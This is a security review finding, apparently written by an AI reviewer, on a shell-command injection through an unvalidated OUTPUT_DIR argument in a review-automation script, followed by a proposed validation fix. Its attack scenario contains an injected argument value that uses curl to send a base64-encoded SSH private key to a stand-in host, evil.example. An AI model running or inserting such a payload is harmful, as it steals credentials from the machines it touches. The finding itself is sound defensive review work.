---
finding_id: R3-F01
reviewer: sec-claude
severity: high
change_type: correctness
referenced_files:
  - scripts/run-codex-review.sh
---

# F01 — Stored shell-command injection via unvalidated OUTPUT_DIR in split_cmd

**Location:** `emit_dispatch_manifest_entry` — `--arg split_cmd` line

```bash
--arg split_cmd "scripts/codex-finding-splitter.sh --round-dir $OUTPUT_DIR --tag $REVIEWER_TAG" \
```

**Issue:** `$OUTPUT_DIR` is bash-expanded into the command-string before being passed to `jq --arg`. jq JSON-encodes the result correctly so the manifest stays well-formed JSON. But the stored value is treated as a shell command fragment by every downstream consumer that later runs it (T20's await-and-split path, any automation that reads `split_cmd` from the manifest and pipes it through `eval`, `bash -c`, etc).

`OUTPUT_DIR` validation only requires (a) non-empty and (b) starts with `/`. No allowlist prevents `; | & $( ) \ <newline>`.

**Attack scenario:** an orchestrator process invokes the script with `--output-dir '/reviews/round-03; curl https://evil.example/exfil?data=$(cat ~/.ssh/id_rsa | base64) &'`. Both validation checks pass. The manifest records the injected payload. Downstream `eval "$(jq -r '.[0].split_cmd' ...)"` executes the attacker commands.

`REVIEWER_TAG` is safe (enforced to `^[a-z][a-z0-9_-]*$`). Missing equivalent on `OUTPUT_DIR` is the gap.

**Fix:** validate OUTPUT_DIR to a safe filesystem-path grammar at parse time:

```bash
if [[ ! "$OUTPUT_DIR" =~ ^/[A-Za-z0-9_./:@-]+$ ]]; then
  echo "error: --output-dir contains unsafe characters" >&2
  exit 1
fi
```

Or single-quote-wrap OUTPUT_DIR inside the stored string.
